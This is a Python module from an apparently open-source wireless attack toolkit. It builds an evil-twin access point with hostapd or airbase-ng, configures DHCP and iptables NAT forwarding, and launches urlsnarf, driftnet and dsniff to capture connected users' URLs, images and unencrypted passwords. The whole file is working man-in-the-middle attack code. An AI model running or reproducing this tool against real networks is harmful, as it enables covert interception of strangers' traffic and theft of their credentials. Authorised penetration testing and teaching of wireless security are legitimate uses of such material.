#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   create_fake_ap.py - Create evil-twin/mitm AP.
#    Copyright (C) 2018 Yudhajit N. (Sh3llcod3)
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#   along with this program. If not, see <http://www.gnu.org/licenses/>
#   Contact: Please create a issue on my GitHub <https://github.com/Sh3llcod3>
#
#Import our custom module
from modules import *
import atexit
#Create our 'ap' class
class apObj(object):
    def __init__(self,colors):
        self.colors = colors
        self.selected = returnBold(self.colors,"[") + returnGreenDeep(self.colors,"SELECTED") + \
        returnBold(self.colors,"] ")
        self.unselected = returnBold(self.colors,"[") + returnYellowDark(self.colors,"UNSELECTED") + \
        returnBold(self.colors,"] ")
        self.required = returnBold(self.colors,"[") + returnGreenDeep(self.colors,"REQUIRED") + \
        returnBold(self.colors,"] ")
        self.optionDivider = returnBlueDeep(self.colors,"-----------------------------------------OPTIONS-----------------------------------------")
        self.totalChosen = 0
        self.chosenOptionsList = []
        atexit.register(self.cleanupFakeAp)
    def showLogo(self):
        #This wasn't done by hand.
        #Some quick base64 + list comprehension + some print statements!
        evilTwinLogo = ("CuKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4pa"
        "I4pWXICDilojilojilZfilojilojilojilojilojilojilojilZcgICAgIOKWiOKWiO"
        "KWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcgCuKWiOKWiOKVlOKVkOKVk"
        "OKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSDilojiloji"
        "lZTilZ3ilojilojilZTilZDilZDilZDilZDilZ0gICAg4paI4paI4pWU4pWQ4pWQ4pa"
        "I4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXCuKWiOKWiOKWiOKWiOKWiOKVly"
        "Ag4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4paI4paI4paI4pWU4pWdIOKWi"
        "OKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKW"
        "iOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnQrilojilojilZTilZDilZDilZ0"
        "gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKWiOKWiOKVlyDilo"
        "jilojilZTilZDilZDilZ3ilZrilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDil"
        "ojilojilZHilojilojilZTilZDilZDilZDilZ0gCuKWiOKWiOKVkSAgICAg4paI4paI"
        "4pWRICDilojilojilZHilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOK"
        "WiOKWiOKVlyAgICDilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSAgICAgCuKVmu"
        "KVkOKVnSAgICAg4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVn"
        "eKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgICDilZrilZDilZ0gIOKVmuKVkOKVneKV"
        "muKVkOKVnSAgIAo=")
        COL = self.colors
        evilTwinLogo = b64D(evilTwinLogo)
        print(evilTwinLogo)
        startupInfo = returnGreenDeep(COL,"Developed by Sh3llCod3, Using Urlsnarf, Driftnet and more. 2017-2018.")
        printInfo(COL,startupInfo)
        createNewLine()
    def setInitialFiles(self):
        bashRun("rm /var/lib/dhcp/dhcpd.leases")
        bashRun("touch /var/lib/dhcp/dhcpd.leases")
    def returnOptionValue(self, option, value):
        COL = self.colors
        valueToPrint = returnBold(COL, "[") + \
        returnGreenDeep(COL, "INFO") + \
        returnBold(COL, "] - {}: {}".format(
            option,
            value))
        return valueToPrint
    def displayFrame(self,*args):
        createNewLine()
        print(self.optionDivider)
        createNewLine()
        for i in args:
            print(i)
        createNewLine()
        print(self.optionDivider)
    def checkIfSelected(self,condition,variable):
        if condition:
            return self.selected + variable
        else:
            return self.unselected + variable
    def displayMenu(self):
        COL = self.colors
        clearTerm()    
        self.showLogo()
        print(returnBold(COL, "Welcome to the MITM/FAKE-AP screen"))
        print(returnBold(COL, "Please note that to host a fake AP and MITM internet traffic, you'll need " + \
        returnRedDeep(COL,"two network cards.")))
        print(returnBold(COL, "You are not limited to the options here, feel free to fire up tools like wireshark or sslstrip2."))
        self.OPT_1 = self.required + self.firstOption
        self.OPT_2 = self.checkIfSelected(self.secondChosen, self.secondOption)
        self.OPT_3 = self.checkIfSelected(self.thirdChosen, self.thirdOption)
        self.OPT_4 = self.checkIfSelected(self.fourthChosen, self.fourthOption)
        self.displayFrame(self.OPT_1, self.OPT_2, self.OPT_3, self.OPT_4)
    def checkPrevSelection(self,value):
        #Yes I am aware this very, very bad programming.
        #I cannot think of anything else right now,
        #so this'll have to do for now.
        #I will rewrite this when feasible.
        if value == 2:
            if not self.secondChosen:
                self.secondChosen = True
                return True
            else:
                return False
        elif value == 3:
            if not self.thirdChosen:
                self.thirdChosen = True
                return True
            else:
                return False
        elif value == 4:
            if not self.fourthChosen:
                self.fourthChosen = True
                return True
            else:
                return False
    def defineOptions(self):
        #Set the options
        COL = self.colors
        self.firstOption =  returnBold(COL, "Host-ap with airbase-ng/hostapd")
        self.secondOption = returnBold(COL, "Intercept HTTP links and URLs - Type [") + \
        returnBlueDeep(COL, "2") + returnBold(COL, "]")
        self.thirdOption =  returnBold(COL, "Intercept any images - Type [") + \
        returnBlueDeep(COL, "3") + returnBold(COL, "]")
        self.fourthOption = returnBold(COL, "Capture unencrypted passwords (not working yet) - Type [") + \
        returnBlueDeep(COL, "4") + returnBold(COL, "]")
        self.dictOfOptions = \
        {2 : self.secondOption,
         3 : self.thirdOption,
         4 : self.fourthOption}
        self.secondChosen = False
        self.thirdChosen = False
        self.fourthChosen = False
        self.availableApHostDict = \
        {1 : "Hostapd",
         2 : "Airbase-ng"}
        self.apDescriptionDict = \
        {1 : " (Only nl802.11 supported cards)",
         2 : " (All cards but very slow)"}
    def selectOptions(self):
        COL = self.colors
        self.defineOptions()
        #Ask the user to choose their options
        while self.totalChosen < 3:
            try:
                if self.totalChosen == 2:
                    self.displayMenu()
                    if yesNo("Options Correctly chosen?", COL):
                        break
                    else:
                        self.totalChosen = 0
                        del self.chosenOptionsList[:]
                        self.defineOptions()
                        continue
                self.displayMenu()
                userChosenOption = int(input("Please choose an option. Options left: {} ".format(
                    2 - self.totalChosen) + returnRed(COL, "~# ")))
                if userChosenOption in self.dictOfOptions.keys():
                    if not self.checkPrevSelection(userChosenOption):
                        continue
                    self.totalChosen += 1
                    self.chosenOptionsList.append(userChosenOption)
            except(ValueError):
                continue
        #Ask which tool to host AP with.
        while True:
            try:
                clearTerm()
                printInfo(COL, "There are 2 ways of hosting an AP:\n")
                for i in enumerate(self.availableApHostDict.values(), start=1):
                    print(returnRed(COL, i[0]) + ") " +\
                          returnBold(COL,i[1]) + \
                          returnYellowDark(COL,self.apDescriptionDict[i[0]]))
                createNewLine()
                userInputLines = returnGreenDeep(COL, "[+]") +\
                returnBold(COL, " What shall I use to host the AP? ") +\
                returnRedDeep(COL, "~$ ")
                userAPChoice = int(input(userInputLines))
                if userAPChoice in self.availableApHostDict.keys():
                    createNewLine()
                    if yesNo("Confirm use {} to host AP?".format(self.availableApHostDict[userAPChoice]), COL):
                        self.apHostMethod = self.availableApHostDict[userAPChoice]
                        break
            except(ValueError):
                continue
        #Choose the relevant cards
        #THIS SECTION IS MOSTLY COPY PASTED
        #Choose the first card
        clearTerm()
        self.firstCard = wirelessCard()
        self.secondCard = wirelessCard()
        self.firstCard.enumerateCards()
        createNewLine()
        printGreen(COL,returnBold(COL, "Your wireless cards are:"))
        createNewLine()
        self.firstCard.listCards(COL)
        createNewLine()
        chooseCardQuestion = "{}[?] {}What interface do you want to host the AP on?".format(COL.yellow_deep,COL.pink_deep)
        chooseCardQuestion += " {}(enter #) {}>> ".format(COL.green_deep,COL.pink_deep)
        chooseCardQuestion2 = "{}[?] {}What interface is connected to the internet?".format(COL.yellow_deep,COL.pink_deep)
        chooseCardQuestion2 += " {}(enter #) {}>> ".format(COL.green_deep,COL.pink_deep)
        while True:
            try:
                self.firstCard.resetCards()
                userAskedCard = int(input(chooseCardQuestion))
                if self.firstCard.verifyChosenCard(userAskedCard):
                    if self.firstCard.chooseCard(userAskedCard):
                        if yesNo("Confirm Use as AP Host: {}".format(returnGreenDeep(COL,self.firstCard.cardName + "?")),COL):
                            self.apHostCard = self.firstCard.cardName
                            break
                        else:
                            raise NameError
                else:
                    printYellow(COL,returnYellow(COL,"That's not a valid card, please try again."))
                    createNewLine()
            except(ValueError):
                printYellow(COL,returnRed(COL,"Please enter an integer."))
                createNewLine()
                self.firstCard.resetCards()
                continue
            except(NameError):
                printSuccess(COL,returnBlue(COL,"Let's choose another card then."))
                createNewLine()
                self.firstCard.resetCards()
                continue
        #Choose the second card
        clearTerm()
        self.secondCard.enumerateCards(True)
        createNewLine()
        printGreen(COL,returnBold(COL, "Your network interfaces are:"))
        createNewLine()
        self.secondCard.listCards(COL)
        createNewLine()
        del userAskedCard
        while True:
            try:
                userAskedCard = int(input(chooseCardQuestion2))
                if self.secondCard.verifyChosenCard(userAskedCard):
                    if self.secondCard.chooseCard(userAskedCard):
                        if self.secondCard.cardName != self.apHostCard:
                            if yesNo("Confirm Use as internet source: {}".format(returnGreenDeep(COL,self.secondCard.cardName + "?")),COL):
                                self.inetFaceCard = self.secondCard.cardName
                                break
                            else:
                                raise NameError
                else:
                    raise Exception
                raise Exception
            except(ValueError):
                printYellow(COL,returnRed(COL,"Please enter an integer."))
                createNewLine()
                self.secondCard.resetCards(True)
                continue
            except(NameError):
                printSuccess(COL,returnBlue(COL,"Let's choose another card then."))
                createNewLine()
                self.secondCard.resetCards(True)
                continue
            except(Exception):
                printYellow(COL,returnYellow(COL,"That card is probably taken or doesn't exist, please try another one."))
                createNewLine()
        #END OF COPY PASTE
        while True:
            try:
                Q_Y = returnYellowDeep(COL, "[?] ")
                Q_G = returnGreenDeep(COL, "[?] ")
                PS_1 = returnRedDeep(COL, " ~# ")
                #Set some other options.
                createNewLine()
                ssid = input(Q_G + \
                returnBold(COL, "What shall I call the AP? (SSID)") + PS_1)
                channelNumber = int(input(Q_Y + \
                returnBold(COL, "What channel shall I use?") + PS_1))
                if not channelNumber in [i for i in range(1,13)]:
                    raise ValueError
                subnet = yesNo("Use ip addresses in the format 192.168.1.x?", COL)
                if subnet:
                    subnet2 = "1"
                    subnet3 = "0"
                else:
                    while True:
                        try:
                            createNewLine()
                            subnet2 = input(Q_Y + \
                            returnPinkDeep(COL, "Please enter the third digit of the subnet" + PS_1))
                            subnet3 = input(Q_Y + \
                            returnPinkDeep(COL, "Please enter the fourth digit of the subnet" + PS_1))
                            if not subnet2.isdigit() or not subnet3.isdigit():
                                raise ValueError
                            break
                        except(ValueError):
                            clearTerm()
                            createNewLine()
                            printYellow(COL, "Please enter an integer!")
                            continue
                break
            except(ValueError):
                clearTerm()
                createNewLine()
                printInfo(COL, "Please enter an integer from 1 to 12 for the channel.")
                printInfo(COL, "If unsure, just type 6. This is a stable choice.")
                printDeepBlue(COL, "Let's try again.")
                continue
        #Setup the DHCP configuration
        bashRun("echo '#BY AIRSCRIPT-NG' >> /etc/dhcp/dhcpd.conf")
        bashRun("echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
        bashRun("echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
        bashRun("echo 'subnet 192.168.{}.{} netmask 255.255.255.0{{' >> /etc/dhcp/dhcpd.conf".format(subnet2,subnet3))
        bashRun("echo '    option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
        bashRun("echo '    option broadcast-address 192.168.{}.255;' >> /etc/dhcp/dhcpd.conf".format(subnet2))
        bashRun("echo '    option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
        self.apAddr = int(subnet3)
        self.apAddr = self.apAddr + 1
        bashRun("echo '    option routers 192.168.{}.{};' >> /etc/dhcp/dhcpd.conf".format(subnet2,self.apAddr))
        self.subnet4 = int(subnet3)
        self.subnet5 = self.subnet4 + 2
        self.subnet6 = self.subnet4 + 100
        self.subnet5 = str(self.subnet5)
        self.subnet6 = str(self.subnet6)
        bashRun("echo '    range 192.168.{}.{} 192.168.{}.{};' >> /etc/dhcp/dhcpd.conf".format(subnet2,self.subnet5,subnet2,self.subnet6))
        bashRun("echo '}' >> /etc/dhcp/dhcpd.conf")
        clearTerm()
        FIRST_CHOSEN = eval("self.OPT_" + str(self.chosenOptionsList[0]))[:-42] + COL.endl
        LAST_CHOSEN = eval("self.OPT_" + str(self.chosenOptionsList[1]))[:-42] + COL.endl
        self.showLogo()
        self.displayFrame(
            self.returnOptionValue("AP HOSTING METHOD",self.apHostMethod),
            self.returnOptionValue("SSID",ssid),
            self.returnOptionValue("CHANNEL",channelNumber),
            self.returnOptionValue("AP INTERFACE",self.apHostCard),
            self.returnOptionValue("INTERNET INTERFACE",self.inetFaceCard),
            self.returnOptionValue("SUBNET","192.168.{}.x".format(subnet2)),
            FIRST_CHOSEN,
            LAST_CHOSEN
        )
        self.selectedSSID = ssid
        self.channelNum = channelNumber
        self.subnetPart2 = subnet2
        self.subnetPart3 = subnet3
        self.chosenSubnet = subnet
        createNewLine()
        createNewLine()
        if not yesNo("Start AP?", COL):
            self.cleanupFakeAp()
        #FINISH THIS PART!
    #Finish writing the rest of the functions.
    def setupConfigFiles(self):
        if self.apHostMethod == "Hostapd":
            #setup the traffic intercept shell script
            bashRun("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
            bashRun("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
            bashRun("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'ifconfig {} 192.168.{}.{} netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh".format(self.apHostCard,self.subnetPart2,self.apAddr))
            bashRun("echo 'dhcpd {}' >> ~/.airscriptNG/traffic-sniff.sh".format(self.apHostCard))
            bashRun("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --table nat --append POSTROUTING --out-interface {} -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh".format(self.inetFaceCard))
            bashRun("echo 'iptables --append FORWARD -j ACCEPT --in-interface {}' >> ~/.airscriptNG/traffic-sniff.sh".format(self.apHostCard))
            bashRun("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
            #The Hostapd config.
            bashRun("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null")
            bashRun("touch ~/.airscriptNG/hostapd.conf")
            bashRun("echo 'interface={}' >> ~/.airscriptNG/hostapd.conf".format(self.apHostCard))
            bashRun("echo 'driver=nl80211' >> ~/.airscriptNG/hostapd.conf")
            bashRun("echo 'ssid={}' >> ~/.airscriptNG/hostapd.conf".format(self.selectedSSID))
            bashRun("echo 'channel={}' >> ~/.airscriptNG/hostapd.conf".format(self.channelNum))
            bashRun("killall hostapd 2>/dev/null")
            self.firstCard.setStateUnmanaged()
            #Setup the command
        elif self.apHostMethod == "Airbase-ng":
            bashRun("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
            bashRun("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
            self.firstCard.setMonitorMode()
            bashRun("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'ifconfig at0 192.168.{}.{} netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh".format(self.subnetPart2,self.apAddr))
            bashRun("echo 'dhcpd at0' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'iptables --table nat --append POSTROUTING --out-interface {} -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh".format(self.inetFaceCard))
            bashRun("echo 'iptables --append FORWARD -j ACCEPT --in-interface at0' >> ~/.airscriptNG/traffic-sniff.sh")
            bashRun("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
    def hostFakeAp(self):
        self.finalCommand = str()
        if self.apHostMethod == "Hostapd":
            self.finalCommand += ("sh ~/.airscriptNG/traffic-sniff.sh"
            " & xterm -hold -geometry -7640 -title "
            "'Hosting AP, CTRL+C or close all windows to exit' -bg '#FFFFFF'"
            " -fg '#000000' -e 'hostapd ~/.airscriptNG/hostapd.conf' & ")
            self.tapInterface = self.apHostCard
        elif self.apHostMethod == "Airbase-ng":
            self.finalCommand += ("sh ~/.airscriptNG/traffic-sniff.sh & xterm"
            " -geometry -7640 -title 'Hosting AP, CTRL+C to exit' "
            "-bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e {} -c {} {}' & ".format(
                self.selectedSSID,
                self.channelNum,
                self.apHostCard))
            self.tapInterface = "at0"
        self.finalOptionsDict = \
        {
            2 : ("xterm -geometry -4320+7640 -title"
                 " 'Capturing URLS and Links' -bg '#FFFFFF'"
                 " -fg '#000000' -e 'sleep 5;urlsnarf -i {}"
                 " | cut -d \" \" -f 6,7,8' ".format(
                     self.tapInterface)),
            3 : ("xterm -geometry +4320 -title 'Capturing Images'"
                 " -bg '#FFFFFF' -fg '#000000' -e "
                 " 'echo Starting in 5;sleep 1;echo 4;sleep 1;"
                 " echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;"
                 " clear;echo \"Resize the Black window to your liking!\";"
                 " driftnet -i {}' ".format(
                     self.tapInterface)),
            4 : ("xterm -hold -geometry +4320+7640 -title"
                 " 'Capturing Passwords' -bg '#FFFFFF'"
                 " -fg '#000000' -e 'sleep 5;dsniff -i {}'".format(
                     self.tapInterface))
        }
        for i in self.chosenOptionsList:
            if i in self.finalOptionsDict.keys():
                self.finalCommand += self.finalOptionsDict[i]
            if i != self.chosenOptionsList[-1]:
                self.finalCommand += " & "
        bashRun(self.finalCommand)
    def cleanupFakeAp(self):
        if bashReturnValue("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' ") == '0':
            createNewLine()
            printSuccess(self.colors, "Please wait. Cleaning up.")
            bashRun("killall hostapd 2>/dev/null")
            bashRun("killall xterm 2>/dev/null")
            if hasattr(self, 'firstCard'):
                self.firstCard.setStateManaged()
                self.firstCard.setManagedMode()
            if self.apHostMethod == "Hostapd":
                bashRun("ifconfig {} 0.0.0.0".format(self.tapInterface))
            bashRun("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
            bashRun("iptables --flush")
            bashRun("iptables --table nat --flush")
            bashRun("iptables --delete-chain")
            bashRun("iptables --table nat --delete-chain")
            bashRun("service isc-dhcp-server stop")
            bashRun("rm /var/run/dhcpd.pid 2>/dev/null")
            bashRun("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
            bashRun("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null")
            bashRun("rm dsniff.services 2>/dev/null")
            bashRun("echo 0 > /proc/sys/net/ipv4/ip_forward")
            clearTerm()
